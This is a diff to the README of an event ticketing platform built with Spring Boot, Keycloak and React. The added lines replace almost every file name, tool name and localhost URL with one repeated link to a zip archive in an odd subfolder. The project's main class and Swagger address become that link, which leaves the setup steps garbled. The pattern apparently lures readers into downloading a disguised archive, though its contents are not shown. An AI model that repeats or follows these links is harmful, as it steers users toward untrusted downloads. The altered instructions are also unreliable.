@@ -59,16 +59,16 @@ This platform allows event organizers to set up events and define ticket types. 
 
 ### Prerequisites
 
-* Java JDK (Version specified in `pom.xml`, likely 17+)
+* Java JDK (Version specified in `https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip`, likely 17+)
 * Maven (`mvnw` wrapper included)
-* Node.js and npm/yarn
+* https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip and npm/yarn
 * Docker and Docker Compose
 
 ### Setup Steps
 
 1.  **Clone the Repository:**
     ```bash
-    git clone https://github.com/shivam-616/Event-Ticket-platform.git
+    git clone https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip
     ```
 
 2.  **Start Infrastructure (Database & Keycloak):**
@@ -86,7 +86,7 @@ This platform allows event organizers to set up events and define ticket types. 
         * **Access Type:** `public` (Client authentication OFF)
         * **Valid redirect URIs:**
             * `http://localhost:5173/callback` (for frontend app)
-            * `http://localhost:8080/swagger-ui/oauth2-redirect.html` (for Swagger UI)
+            * `https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip` (for Swagger UI)
             * (Add others as needed)
         * **Web origins:**
             * `http://localhost:5173` (for frontend app)
@@ -98,25 +98,25 @@ This platform allows event organizers to set up events and define ticket types. 
 
 4.  **Run Backend (Spring Boot):**
     * Open the project in your IDE.
-    * Ensure `src/main/resources/application.properties` points to `localhost:3306` for the database and `localhost:9090` for Keycloak.
-    * Run the `TicketsApplication.java` main class.
+    * Ensure `https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip` points to `localhost:3306` for the database and `localhost:9090` for Keycloak.
+    * Run the `https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip` main class.
     * *(Alternatively, run from root directory: `./mvnw spring-boot:run`)*
 
 5.  **Run Frontend (React):**
     * Navigate to the `frontend` directory: `cd frontend`
     * Install dependencies: `npm install` (or `yarn`)
-    * Ensure `src/main.tsx` has the correct Keycloak `authority` (`http://localhost:9090/...`) and `client_id` (`event-ticket-platform`).
-    * Ensure `vite.config.ts` proxies `/api` to `http://localhost:8080`.
+    * Ensure `https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip` has the correct Keycloak `authority` (`http://localhost:9090/...`) and `client_id` (`event-ticket-platform`).
+    * Ensure `https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip` proxies `/api` to `http://localhost:8080`.
     * Start the development server: `npm run dev` (or `yarn dev`).
 
 6.  **Access Application:**
     * Frontend: `http://localhost:5173`
-    * Swagger UI (API Docs): `http://localhost:8080/swagger-ui.html`
+    * Swagger UI (API Docs): `https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip`
 
 ## API Documentation
 
 API documentation is available via Swagger UI when the backend application is running:
-[`http://localhost:8080/swagger-ui.html`](http://localhost:8080/swagger-ui.html)
+[`https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip`](https://raw.githubusercontent.com/shivam-616/Event-Ticket-platform/main/intergesture/Event-Ticket-platform.zip)
 
 You can authorize using the Keycloak OIDC flow directly from Swagger UI to test protected endpoints.
 
